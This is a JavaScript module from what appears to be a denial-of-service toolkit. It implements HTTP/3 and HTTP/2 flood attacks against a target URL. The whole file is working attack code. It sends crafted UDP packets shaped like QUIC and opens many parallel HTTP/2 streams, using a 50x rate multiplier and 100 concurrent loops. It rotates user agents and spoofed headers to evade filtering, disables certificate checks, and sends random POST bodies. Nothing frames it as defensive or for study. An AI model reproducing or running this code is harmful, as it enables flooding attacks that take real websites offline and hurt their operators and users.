import http2 from 'http2';
import https from 'https';
import dgram from 'dgram';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * HTTP/3 (QUIC Protocol) Attack
 * With fallback to HTTP/2 when HTTP/3 not available
 */
export class HTTP3Attack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc * 50; // 50x multiplier for maximum power
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        this.http3Available = false;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        // Check HTTP/3 support
        await this.checkHTTP3Support();

        while (Date.now() < endTime && this.active) {
            // 100 concurrent attacks
            const attacks = [];
            for (let i = 0; i < 100; i++) {
                if (this.http3Available) {
                    attacks.push(this.attackHTTP3());
                } else {
                    // Fallback to HTTP/2
                    attacks.push(this.attackHTTP2());
                }
            }
            await Promise.allSettled(attacks);
        }
    }

    /**
     * Check if target supports HTTP/3
     */
    async checkHTTP3Support() {
        try {
            // Try to detect Alt-Svc header for HTTP/3
            const response = await new Promise((resolve, reject) => {
                const req = https.request({
                    hostname: this.url.hostname,
                    port: this.url.port || 443,
                    path: '/',
                    method: 'HEAD',
                    timeout: 3000,
                    rejectUnauthorized: false
                }, (res) => {
                    resolve(res);
                });
                req.on('error', reject);
                req.on('timeout', () => {
                    req.destroy();
                    reject(new Error('Timeout'));
                });
                req.end();
            });

            // Check for Alt-Svc header indicating HTTP/3 support
            const altSvc = response.headers['alt-svc'];
            if (altSvc && (altSvc.includes('h3=') || altSvc.includes('h3-29='))) {
                this.http3Available = true;
                logger.info('HTTP/3 support detected, using QUIC protocol');
            } else {
                logger.info('HTTP/3 not available, using HTTP/2 fallback');
            }
        } catch (e) {
            logger.debug('HTTP/3 detection failed, using HTTP/2 fallback');
        }
    }

    /**
     * Generate advanced HTTP/3 headers
     */
    generateHeaders() {
        const headers = {
            'Host': this.url.host,
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, zstd', // zstd for HTTP/3
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Cache-Control': 'max-age=0',
            'Priority': 'u=0, i',
            // HTTP/3 specific headers
            'Alt-Used': this.url.host,
            'QUIC-Version': 'h3',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['Referer'] = Tools.randomChoice(this.referers);
        }

        return headers;
    }

    /**
     * HTTP/3 attack using QUIC-like protocol
     */
    async attackHTTP3() {
        return new Promise((resolve) => {
            try {
                // Simulate QUIC packet structure
                const socket = dgram.createSocket('udp4');
                const port = this.url.port || 443;
                let completed = 0;

                const sendQUICPackets = () => {
                    if (!this.active || completed >= this.rpc) {
                        socket.close();
                        resolve();
                        return;
                    }

                    try {
                        // Build QUIC-like packet
                        const packet = this.buildQUICPacket();
                        
                        socket.send(packet, 0, packet.length, port, this.url.hostname, (err) => {
                            if (!err) {
                                REQUESTS_SENT.add(1);
                                BYTES_SENT.add(packet.length);
                            }
                        });

                        completed++;
                        setImmediate(sendQUICPackets);
                    } catch (e) {
                        setImmediate(sendQUICPackets);
                    }
                };

                socket.on('error', () => {
                    socket.close();
                    resolve();
                });

                // Send from 20 parallel chains
                for (let i = 0; i < 20; i++) {
                    sendQUICPackets();
                }

                setTimeout(() => {
                    socket.close();
                    resolve();
                }, 3000);
            } catch (e) {
                resolve();
            }
        });
    }

    /**
     * Build QUIC-like packet structure
     */
    buildQUICPacket() {
        // QUIC packet structure (simplified)
        const flags = 0xC0 | (Math.random() > 0.5 ? 0x01 : 0x00); // Long header
        const version = Buffer.from([0x00, 0x00, 0x00, 0x01]); // QUIC v1
        
        // Connection ID
        const dcidLen = Math.floor(Math.random() * 12) + 8;
        const scidLen = Math.floor(Math.random() * 12) + 8;
        const dcid = Tools.randomBytesBuffer(dcidLen);
        const scid = Tools.randomBytesBuffer(scidLen);
        
        // Payload
        const headers = this.generateHeaders();
        const headerStr = Object.entries(headers)
            .map(([k, v]) => `${k}: ${v}`)
            .join('\r\n');
        
        const payload = Buffer.from(
            `GET ${this.url.pathname}${this.url.search} HTTP/3\r\n` +
            headerStr +
            '\r\n\r\n'
        );
        
        // Build packet
        const packet = Buffer.concat([
            Buffer.from([flags]),
            version,
            Buffer.from([dcidLen, scidLen]),
            dcid,
            scid,
            payload
        ]);

        return packet;
    }

    /**
     * HTTP/2 fallback attack
     */
    async attackHTTP2() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false,
                settings: {
                    headerTableSize: 65536,
                    enablePush: true,
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxHeaderListSize: 262144
                }
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            let completed = 0;

            const makeRequest = () => {
                if (!this.active || completed >= this.rpc) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const headers = {};
                    const rawHeaders = this.generateHeaders();
                    
                    headers[':method'] = 'GET';
                    headers[':path'] = this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `h3=${Date.now()}`;
                    headers[':scheme'] = 'https';
                    headers[':authority'] = this.url.host;
                    
                    Object.entries(rawHeaders).forEach(([key, value]) => {
                        if (!key.startsWith(':')) {
                            headers[key.toLowerCase()] = value;
                        }
                    });

                    const req = client.request(headers);

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.end();
                    BYTES_SENT.add(800);
                    completed++;
                    
                    setImmediate(makeRequest);
                } catch (e) {
                    setImmediate(makeRequest);
                }
            };

            // 30 parallel request chains
            for (let i = 0; i < 30; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 3000);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/3 POST Attack
 */
export class HTTP3PostAttack extends HTTP3Attack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        super(targetUrl, duration, rpc, userAgents, referers, proxies);
    }

    /**
     * Override to build POST packet
     */
    buildQUICPacket() {
        const flags = 0xC0;
        const version = Buffer.from([0x00, 0x00, 0x00, 0x01]);
        
        const dcidLen = Math.floor(Math.random() * 12) + 8;
        const scidLen = Math.floor(Math.random() * 12) + 8;
        const dcid = Tools.randomBytesBuffer(dcidLen);
        const scid = Tools.randomBytesBuffer(scidLen);
        
        const headers = this.generateHeaders();
        const postData = {
            action: 'attack',
            timestamp: Date.now(),
            data: Tools.randomString(512)
        };
        
        headers['Content-Type'] = 'application/json';
        headers['Content-Length'] = JSON.stringify(postData).length;
        
        const headerStr = Object.entries(headers)
            .map(([k, v]) => `${k}: ${v}`)
            .join('\r\n');
        
        const payload = Buffer.from(
            `POST ${this.url.pathname}${this.url.search} HTTP/3\r\n` +
            headerStr +
            '\r\n\r\n' +
            JSON.stringify(postData)
        );
        
        const packet = Buffer.concat([
            Buffer.from([flags]),
            version,
            Buffer.from([dcidLen, scidLen]),
            dcid,
            scid,
            payload
        ]);

        return packet;
    }

    /**
     * Override HTTP/2 fallback for POST
     */
    async attackHTTP2() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456
                }
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            let completed = 0;

            const makeRequest = () => {
                if (!this.active || completed >= this.rpc) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const postData = JSON.stringify({
                        action: 'attack',
                        timestamp: Date.now(),
                        data: Tools.randomString(512)
                    });

                    const headers = {};
                    const rawHeaders = this.generateHeaders();
                    
                    headers[':method'] = 'POST';
                    headers[':path'] = this.url.pathname + this.url.search;
                    headers[':scheme'] = 'https';
                    headers[':authority'] = this.url.host;
                    headers['content-type'] = 'application/json';
                    headers['content-length'] = Buffer.byteLength(postData);
                    
                    Object.entries(rawHeaders).forEach(([key, value]) => {
                        if (!key.startsWith(':') && !key.toLowerCase().includes('content')) {
                            headers[key.toLowerCase()] = value;
                        }
                    });

                    const req = client.request(headers);

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.write(postData);
                    req.end();
                    
                    BYTES_SENT.add(Buffer.byteLength(postData) + 800);
                    completed++;
                    
                    setImmediate(makeRequest);
                } catch (e) {
                    setImmediate(makeRequest);
                }
            };

            for (let i = 0; i < 30; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 3000);
        });
    }
}
